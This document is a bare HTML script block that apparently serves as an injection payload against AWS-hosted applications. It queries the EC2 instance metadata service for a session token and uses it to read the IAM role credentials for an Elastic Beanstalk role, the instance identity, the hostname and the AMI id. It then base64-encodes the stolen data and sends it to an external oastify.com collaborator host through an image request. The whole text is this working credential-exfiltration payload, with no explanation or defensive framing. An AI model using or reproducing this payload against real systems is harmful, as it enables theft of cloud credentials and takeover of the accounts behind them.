<script>
fetch('http://169.254.169.254/latest/api/token', {headers:{'X-aws-ec2-metadata-token-ttl-seconds':'21600'}})
.then(r=>r.text()).then(t=>Promise.all([
  fetch('http://169.254.169.254/latest/dynamic/instance-identity/document', {headers:{'X-aws-ec2-metadata-token':t}}).then(r=>r.text()),
  fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {headers:{'X-aws-ec2-metadata-token':t}}).then(r=>r.text()),
  fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role', {headers:{'X-aws-ec2-metadata-token':t}}).then(r=>r.json().catch(()=>r.text())),
  fetch('http://169.254.169.254/latest/meta-data/public-hostname', {headers:{'X-aws-ec2-metadata-token':t}}).then(r=>r.text()),
  fetch('http://169.254.169.254/latest/meta-data/ami-id', {headers:{'X-aws-ec2-metadata-token':t}}).then(r=>r.text())
]))
.then(data=>new Image().src='https://c4hpktbt1dhb4z61eayuhu5npev5jwjk8.oastify.com/?aws='+btoa(JSON.stringify({
  identity: data[0],
  role_name: data[1],
  creds: data[2],
  hostname: data[3],
  ami: data[4]
}))))
.catch(()=>'');
</script>
